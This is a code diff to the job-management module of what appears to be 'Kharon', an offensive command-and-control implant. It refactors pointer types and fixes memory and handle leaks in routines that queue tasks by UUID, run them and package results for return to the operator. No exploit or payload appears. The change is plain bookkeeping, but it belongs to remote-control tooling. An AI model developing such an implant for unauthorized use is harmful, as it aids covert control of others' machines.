@@ -1,14 +1,16 @@
 #include <Kharon.h>
 
 auto DECLFN Jobs::Create(
-    _In_ PCHAR    UUID, 
-    _In_ PPARSER  Parser
+    _In_ CHAR*   UUID, 
+    _In_ PARSER* Parser
 ) -> PJOBS {
-    PJOBS   NewJob = (PJOBS)Self->Hp->Alloc( sizeof( JOBS ) );
-    PPARSER JobPsr = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );
+    JOBS*   NewJob = (JOBS*)Self->Hp->Alloc( sizeof( JOBS ) );
+    PARSER* JobPsr = (PARSER*)Self->Hp->Alloc( sizeof( PARSER ) );
 
-    if ( !NewJob ) {
-        return NULL;
+    if ( !NewJob || !JobPsr ) {
+        if ( NewJob ) Self->Hp->Free( NewJob );
+        if ( JobPsr ) Self->Hp->Free( JobPsr );
+        return nullptr;
     }
     
     ULONG Length = 0;
@@ -25,12 +27,18 @@ auto DECLFN Jobs::Create(
     NewJob->Psr      = JobPsr;
     NewJob->Pkg      = Self->Pkg->Create( NewJob->CmdID, UUID );
 
+    if ( !NewJob->Pkg ) {
+        Self->Hp->Free( NewJob );
+        Self->Hp->Free( JobPsr );
+        return nullptr;
+    }
+
     KhDbg( "adding job with uuid: %s and command id: %d", NewJob->UUID, NewJob->CmdID );
 
     if ( !List ) {
         List = NewJob;
     } else {
-        PJOBS Current = List;
+        JOBS* Current = List;
         while ( Current->Next ) {
             Current = Current->Next;
         }
@@ -45,10 +53,10 @@ auto DECLFN Jobs::Create(
 }
 
 auto DECLFN Jobs::Send(
-    _In_ PPACKAGE PostJobs
+    _In_ PACKAGE* PostJobs
 ) -> VOID {
     
-    PJOBS Current = List;
+    JOBS* Current = List;
 
     while ( Current ) {
         if ( 
@@ -89,6 +97,7 @@ auto DECLFN Jobs::Send(
 
             if ( MsgLen > 0 && ErrorMsg ) {
                 Self->Pkg->Str( PostJobs, ErrorMsg );
+                Self->Krnl32.LocalFree( ErrorMsg );
             } else {
                 Self->Pkg->Str( PostJobs, Unknown );
             }
@@ -105,12 +114,12 @@ auto DECLFN Jobs::Send(
 }
 
 auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
-    PJOBS Current  = this->List;
-    PJOBS Previous = nullptr;
+    JOBS* Current  = this->List;
+    JOBS* Previous = nullptr;
 
     while ( Current ) {
         if ( Current->State == KH_JOB_TERMINATE ) {
-            PJOBS ToRemove = Current;
+            JOBS* ToRemove = Current;
              
             if ( Previous ) {
                 Previous->Next = Current->Next;
@@ -118,6 +127,10 @@ auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
             } else {
                 this->List = Current->Next;
                 Current    = this->List;
+            }
+
+            if ( ToRemove->Thread.Handle ) {
+                Self->Ntdll.NtClose( ToRemove->Thread.Handle );
             }
 
             if ( ToRemove->Pkg ) {
@@ -139,7 +152,7 @@ auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
 }
 
 auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
-    PJOBS Current = this->List;
+    JOBS* Current = this->List;
 
     while ( Current ) {
         if ( Current->State == KH_JOB_PRE_START ) {
@@ -165,7 +178,7 @@ auto DECLFN Jobs::ExecuteAll( VOID ) -> VOID {
 }
 
 auto DECLFN Jobs::Execute(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> ERROR_CODE {
     G_KHARON
 
@@ -178,9 +191,9 @@ auto DECLFN Jobs::Execute(
 }
 
 auto DECLFN Jobs::GetByUUID(
-    _In_ PCHAR UUID
-) -> PJOBS {
-    PJOBS Current = this->List;
+    _In_ CHAR* UUID
+) -> JOBS* {
+    JOBS* Current = this->List;
     while ( Current ) {
         if ( Str::CompareA( Current->UUID, UUID ) == 0 ) {
             return Current;
@@ -192,8 +205,8 @@ auto DECLFN Jobs::GetByUUID(
 
 auto DECLFN Jobs::GetByID(
     _In_ ULONG ID
-) -> PJOBS {
-    PJOBS Current = this->List;
+) -> JOBS* {
+    JOBS* Current = this->List;
     while ( Current ) {
         if ( Current->CmdID == ID ) {
             return Current;
@@ -204,14 +217,14 @@ auto DECLFN Jobs::GetByID(
 }
 
 auto DECLFN Jobs::Remove(
-    _In_ PJOBS Job
+    _In_ JOBS* Job
 ) -> BOOL {
     if ( !this->List ) return FALSE;
     
     if ( this->List == Job ) {
         this->List = Job->Next;
     } else {
-        PJOBS Current = this->List;
+        JOBS* Current = this->List;
         while ( Current->Next && Current->Next != Job ) {
             Current = Current->Next;
         }
